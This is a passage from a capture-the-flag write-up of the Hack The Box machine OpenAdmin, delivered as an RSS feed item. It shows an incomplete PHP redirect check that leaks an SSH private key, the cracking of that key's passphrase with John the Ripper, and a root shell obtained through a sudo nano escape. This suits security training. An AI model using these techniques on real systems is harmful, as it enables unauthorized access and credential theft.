        <span style="color:#e6db74">&#39;db_database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_default&#39;</span>,
        <span style="color:#e6db74">&#39;db_debug&#39;</span> <span style="color:#f92672">=</span>&gt; false,
      <span style="color:#f92672">)</span>,
    <span style="color:#f92672">)</span>,
    <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;Default data context&#39;</span>,
    <span style="color:#e6db74">&#39;context_color&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;#D3DBFF&#39;</span>,
  <span style="color:#f92672">)</span>,
<span style="color:#f92672">)</span>;
</code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p>
<p><div class="img-container"><img src="imgs/25ec2fca7eb84dad9f748aeb299ef35b.png" alt="a0518e175f0d68951eac7bbb348b24e0.png"  /></div>
</p>
<h3 id="shell-as-joanna">Shell as joanna</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null

...&lt;SNIP&gt;...
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/login.php
...&lt;SNIP&gt;...
</code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p>
<p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

&lt;VirtualHost 127.0.0.1:52846&gt;
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

&lt;IfModule mpm_itk_module&gt;
AssignUserID joanna joanna
&lt;/IfModule&gt;

    ErrorLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/error.log
    CustomLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/access.log combined

&lt;/VirtualHost&gt;
</code></pre></div><h4 id="code-review---improper-redirection">Code review - Improper redirection</h4>
<p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:/var/www/internal/$ cat main.php

&lt;?php session_start<span style="color:#f92672">()</span>; <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!isset <span style="color:#f92672">(</span>$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span> header<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location: /index.php&#34;</span><span style="color:#f92672">)</span>; <span style="color:#f92672">}</span>; 
<span style="color:#75715e"># Open Admin Trusted</span>
<span style="color:#75715e"># OpenAdmin</span>
$output <span style="color:#f92672">=</span> shell_exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span style="color:#f92672">)</span>;
echo <span style="color:#e6db74">&#34;&lt;pre&gt;</span>$output<span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
?&gt;
&lt;html&gt;
&lt;h3&gt;Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t forget your <span style="color:#e6db74">&#34;ninja&#34;</span> password&lt;/h3&gt;
Click here to logout &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logout.php&#34;</span> tite <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Logout&#34;</span>&gt;Session
&lt;/html&gt;
</code></pre></div><p>This line code has an improper redirection.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_start</span>(); 
	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) { 
		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /index.php&#34;</span>); 
        <span style="color:#75715e"># `die();` or `exit();` function should be called here.
</span><span style="color:#75715e"></span>	};
<span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$output</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
</span></code></pre></div><p>The code above checks users' sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
</code></pre></div><p><div class="img-container"><img src="imgs/ea391edd6c66409d8bb551eecdac08d5.png" alt="6b73c3ba7aa0ba3e068b85435dc8aeb1.png"  /></div>
</p>
<h4 id="password-cracking">Password cracking</h4>
<p>The private key is encrypted with a password.   <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
</code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">john.exe user2.txt --wordlist=rockyou.txt
</code></pre></div><p><div class="img-container"><img src="imgs/fa7463b8239345409a2250597b3dfa69.png" alt="ca148e3ae5b2e8b65406e0d387ca1771.png"  /></div>
</p>
<h4 id="ssh-access-1">SSH access</h4>
<p>Now I can login as user <code>joanna</code> via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ ssh -i joanna_rsa joanna@10.10.10.171
</code></pre></div><p><div class="img-container"><img src="imgs/673cb008921d4eba886820c17fef43a0.png" alt="8f710060b1059b0ddb7cae2253e0c1ac.png"  /></div>
</p>
<p>The user flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-nano">Abusing sudo nano</h4>
<p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p>
<blockquote>
<p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> joanna on openadmin:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User joanna may run the following commands on openadmin:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /bin/nano /opt/priv
</code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv
</code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at  <code>/root/root.txt</code></p>
<center>
<p><div class="img-container"><img src="imgs/image-20210404121427744.png" alt="image-20210404121427744"  /></div>
</p>
</center>
<p>To gain root shell as follows I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> page:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv <span style="color:#75715e"># Opening nano as root</span>
^R^X <span style="color:#75715e"># CTRL+R (read/open file), CTRL+X(execute command)</span>
reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span> <span style="color:#75715e"># Escape from nano</span>
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
